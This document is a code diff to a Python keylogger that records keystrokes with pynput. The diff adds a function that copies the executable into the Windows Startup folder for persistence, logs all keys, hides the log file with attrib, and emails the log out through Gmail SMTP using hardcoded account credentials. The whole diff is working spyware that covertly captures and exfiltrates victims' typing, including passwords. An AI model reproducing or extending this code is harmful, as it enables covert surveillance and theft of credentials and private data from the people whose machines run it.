@@ -1,6 +1,28 @@
 from pynput import keyboard
+import time, subprocess
 
-f = open('.log.txt',"a+")
+f = open('log.txt',"a+")
+
+
+"""
+Generate an executable at the startup's windows folder so the keylogger can be automatically runned
+"""
+def infect():
+	import os
+	from shutil import copy2
+	
+	currentDir = os.getcwd()
+	currentUser = os.getlogin()
+
+	target = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % currentUser
+
+	if(currentDir != target):
+		currentFile = currentDir+"\\keylogger.exe"
+		try:
+			copy2(currentFile,target)
+		except:
+			print("exe not found")
+    
 
 """
 Allows to send log via mail (opening a client session using SMTP protocol). If a gmail account is used, enable access of unsafe applications in your google settings
@@ -29,7 +51,7 @@ def send_mail(sender, sender_password, reciever):
     msg["To"] = reciever
     
     msg.attach(MIMEText('Download the file', 'plain'))
-    attach_file_name = '.log.txt'
+    attach_file_name = 'log.txt'
     attach_file = open(attach_file_name, 'rb')
     payload = MIMEBase('application', 'octate-stream')
     payload.set_payload((attach_file).read())
@@ -64,9 +86,14 @@ def on_press(key):
                 f.write(" ")
             elif(k=="enter"):
                 f.write("\n")
+			else:
+				f.write(k)
             print('Key pressed: ' + k)
         except AttributeError: # if a key has no name, raises an error
             f.write("[missing]")
+
+
+infect()
 
 listener = keyboard.Listener(on_press=on_press)
 
@@ -74,6 +101,6 @@ listener.start()  # start to listen on a separate thread
 listener.join()  # remove if main thread is polling self.keys
 
 f.close()
+subprocess.check_call(["attrib","+H","log.txt"])
 
-# send mail
 send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
